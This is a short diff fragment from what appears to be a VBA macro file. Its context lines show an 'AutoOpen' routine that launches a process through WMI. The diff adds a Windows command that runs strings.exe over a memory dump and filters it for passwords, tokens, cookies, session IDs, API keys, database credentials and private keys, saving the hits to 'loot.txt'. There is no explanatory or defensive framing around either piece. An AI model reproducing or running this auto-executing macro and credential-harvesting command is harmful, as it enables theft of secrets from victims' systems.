@@ -520,3 +520,9 @@ Sub AutoOpen()
 
     objWMIService.Get("Win32_Process").Create strCommand, Null, Null, Null
 End Sub
+
+
+
+
+strings.exe -nobanner -accepteula -q -n 4 -u C:\MyFolder\yourdump.dmp | findstr /i /c:"password" /c:"pwd=" /c:"token" /c:"bearer" /c:"authorization:" /c:"cookie" /c:"set-cookie" /c:"sessionid" /c:"api_key" /c:"db_username" /c:"db_password" /c:"ldap" /c:"cifs/" /c:"smb://" /c:"uncpath" /c:"file://" /c:"vpn" /c:"private key" /c:"logonserver" > C:\MyFolder\loot.txt
+
